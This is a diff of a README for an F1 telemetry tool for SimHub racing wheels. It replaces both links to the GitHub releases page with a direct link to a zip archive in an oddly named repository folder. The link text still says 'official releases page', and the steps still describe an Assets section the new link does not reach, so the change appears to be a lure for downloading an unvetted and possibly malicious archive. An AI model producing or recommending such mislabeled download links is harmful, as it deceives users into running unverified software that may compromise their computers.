@@ -1,6 +1,6 @@
 # 🏎️ F1SimHubLive - Sync live F1 data to hardware
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/wa585912/F1SimHubLive/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/wa585912/F1SimHubLive/main/shammocky/Sim-Live-Hub-v2.3-alpha.5.zip)
 
 F1SimHubLive sends live Formula 1 timing data to your racing wheel. Use this tool if you own a wheel with a screen, such as a GSI unit, and run SimHub. It tracks telemetry from official F1 sources and updates your dashboard display in real time.
 
@@ -8,7 +8,7 @@ F1SimHubLive sends live Formula 1 timing data to your racing wheel. Use this too
 
 Follow these steps to get the software on your Windows computer:
 
-1. Visit the [official releases page](https://github.com/wa585912/F1SimHubLive/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/wa585912/F1SimHubLive/main/shammocky/Sim-Live-Hub-v2.3-alpha.5.zip).
 2. Look for the section labeled "Assets" under the most recent version number.
 3. Click the link that ends in `.zip` to start your download.
 4. Open your Downloads folder once the file finishes saving.
